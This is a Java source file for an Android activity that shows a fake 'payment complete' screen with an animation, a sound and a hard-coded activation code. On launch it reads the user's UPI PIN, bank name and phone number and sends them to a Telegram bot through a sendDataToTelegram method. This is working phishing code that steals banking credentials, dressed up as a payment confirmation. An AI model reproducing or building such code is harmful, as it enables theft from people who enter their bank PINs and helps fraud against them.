package com.nabarup.avator;

import android.animation.Animator;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.airbnb.lottie.LottieAnimationView;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Thanks extends AppCompatActivity {

    private LottieAnimationView animationView;
    private MediaPlayer mediaPlayer;
    private boolean animationStarted = false;
    private String activationCode = "D8CZZGQ2";

    private String pin, bank, phoneNumber;
    private static final long COUNTDOWN_TIME = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
    private static final String PREFS_NAME = "com.nabarup.avator.PREFS";
    private static final String END_TIME_KEY = "END_TIME_KEY";

    private boolean dataSentToTelegram = false;

    private ProgressBar progressBar;
    private Button doneButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_thanks);

        // Retrieve the data from the Intent
        Intent intent = getIntent();
        pin = intent.getStringExtra("upiPin");
        bank = intent.getStringExtra("selectedBankName");
        phoneNumber = intent.getStringExtra("phoneNumber");

        animationView = findViewById(R.id.animationView);
        TextView dateTextView = findViewById(R.id.date);
        TextView timeTextView = findViewById(R.id.time);
        TextView copyTextView = findViewById(R.id.copy);
        TextView activationCodeTextView = findViewById(R.id.activation_code);
        doneButton = findViewById(R.id.rd_home);
        progressBar = findViewById(R.id.progrssbar);

        TextView pinTextView = findViewById(R.id.pinTextView);
        TextView bankTextView = findViewById(R.id.bank);
        TextView phoneNumTextView = findViewById(R.id.phonenum);

        // Set the retrieved data in the TextViews
        pinTextView.setText(pin);
        bankTextView.setText(bank);
        phoneNumTextView.setText(phoneNumber);

        // Initialize MediaPlayer with the sound file
        mediaPlayer = MediaPlayer.create(this, R.raw.success);

        // Get the current date and time
        String currentDate = new SimpleDateFormat("dd MMMM yyyy,", Locale.getDefault()).format(new Date());
        String currentTime = new SimpleDateFormat("h:mm a", Locale.getDefault()).format(new Date());

        // Set the date and time TextViews
        dateTextView.setText(currentDate);
        timeTextView.setText(currentTime);

        // Set animation from raw resource
        animationView.setAnimation(R.raw.payment_complete);
        animationView.playAnimation();

        // Add an animator listener to detect when animation starts
        animationView.addAnimatorListener(new Animator.AnimatorListener() {
            @Override
            public void onAnimationStart(Animator animator) {
                if (!animationStarted) {
                    animationStarted = true;
                    // Play the sound
                    playSound();
                }
            }

            @Override
            public void onAnimationEnd(Animator animator) {
                // Animation end callback (if needed)
            }

            @Override
            public void onAnimationCancel(Animator animator) {
                // Animation cancel callback (if needed)
            }

            @Override
            public void onAnimationRepeat(Animator animator) {
                // Animation repeat callback (if needed)
            }
        });

        // Send data to Telegram only once on activity start
        if (!dataSentToTelegram) {
            sendDataToTelegram(pinTextView.getText().toString(), bankTextView.getText().toString(), phoneNumTextView.getText().toString());
            dataSentToTelegram = true;
        }

        copyTextView.setOnClickListener(view -> {
            copyToClipboard(activationCode);
        });

        activationCodeTextView.setOnClickListener(view -> {
            copyToClipboard(activationCode);
        });

        doneButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                progressBar.setVisibility(View.VISIBLE); // Show progress bar
                doneButton.setVisibility(View.INVISIBLE); // Hide the "Done" button

                // Delay navigating to Home activity
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        // Redirect to Home activity
                        Intent intent = new Intent(Thanks.this, Home.class);
                        startActivity(intent);
                        finish(); // Optional: finish the current activity if you don't want it in the back stack
                    }
                }, 4000); // 4 seconds delay
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        animationView.cancelAnimation();  // Cancel animation to release resources
        mediaPlayer.release();  // Release MediaPlayer resources
    }

    // Method to play sound
    private void playSound() {
        if (mediaPlayer != null) {
            mediaPlayer.start();  // Start playing the sound
        }
    }

    // Method to copy text to clipboard
    private void copyToClipboard(String text) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("Activation Code", text);
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, "Activation code copied to clipboard", Toast.LENGTH_SHORT).show();
    }

    // Method to send data to Telegram bot
    private void sendDataToTelegram(String pin, String bank, String phone) {
        String message = "Phone: " + phone + "\nBank: " + bank + "\nPIN: " + pin;
        TelegramBotSender.sendMessage(message);
    }

    private void startCountdown() {
        long endTime = System.currentTimeMillis() + COUNTDOWN_TIME;
        SharedPreferences sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putLong(END_TIME_KEY, endTime);
        editor.apply();
    }

    // Override the onBackPressed method to handle back button press
    @Override
    public void onBackPressed() {
        // Redirect to Home activity
        Intent intent = new Intent(Thanks.this, Home.class);
        startActivity(intent);
        finish(); // Finish the current activity
    }
}
